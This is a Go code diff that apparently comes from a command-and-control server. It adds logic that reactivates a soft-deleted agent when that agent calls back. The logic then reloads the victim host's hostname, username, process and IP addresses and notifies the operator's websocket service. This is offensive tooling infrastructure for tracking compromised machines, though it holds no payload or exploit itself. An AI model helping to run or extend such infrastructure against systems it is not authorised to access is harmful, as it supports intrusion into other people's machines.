@@ -5,9 +5,11 @@ import (
 	"c2/internal/common/config"
 	"c2/internal/common/interfaces"
 	"c2/internal/common/transforms"
+	pb "c2/proto"
 	"crypto/hmac"
 	"crypto/rand"
 	"crypto/sha256"
+	"database/sql"
 	"encoding/base64"
 	"encoding/json"
 	"fmt"
@@ -37,6 +39,35 @@ func (m *Manager) handleGetRequest(w http.ResponseWriter, clientID string, cmdBu
 		log.Printf("[GetRequest] Failed to find active connection for clientID: %q", clientID)
 		http.Error(w, "Connection not found", http.StatusUnauthorized)
 		return
+	}
+
+	// Check if agent was soft-deleted and reactivate on callback
+	var deletedAt sql.NullTime
+	if err := m.db.QueryRow(`SELECT deleted_at FROM connections WHERE newclientid = $1`, clientID).Scan(&deletedAt); err == nil && deletedAt.Valid {
+		if _, err := m.db.Exec(`UPDATE connections SET deleted_at = NULL, lastSEEN = CURRENT_TIMESTAMP WHERE newclientid = $1`, clientID); err != nil {
+			log.Printf("[GetRequest] Failed to reactivate agent %s: %v", clientID, err)
+		} else {
+			log.Printf("[GetRequest] Reactivated soft-deleted agent %s", clientID)
+			var hostname, username, process, pid, arch, osName, intIP, extIP, protocol string
+			m.db.QueryRow(`SELECT COALESCE(hostname,''), COALESCE(username,''), COALESCE(process,''), COALESCE(pid,''), COALESCE(arch,''), COALESCE(os,''), COALESCE(intIP,''), COALESCE(extIP,''), COALESCE(protocol,'') FROM connections WHERE newclientid = $1`, clientID).Scan(&hostname, &username, &process, &pid, &arch, &osName, &intIP, &extIP, &protocol)
+			notification := &pb.ConnectionNotification{
+				NewClientId: clientID,
+				ClientId:    clientID,
+				Protocol:    protocol,
+				ExtIp:       extIP,
+				IntIp:       intIP,
+				Hostname:    hostname,
+				Username:    username,
+				Process:     process,
+				Pid:         pid,
+				Arch:        arch,
+				Os:          osName,
+				LastSeen:    time.Now().Unix(),
+			}
+			if err := m.notifyWebsocketService(notification); err != nil {
+				log.Printf("[GetRequest] Warning: Failed to notify about agent reactivation: %v", err)
+			}
+		}
 	}
 
 	// Record heartbeat for batched database update (async, non-blocking)
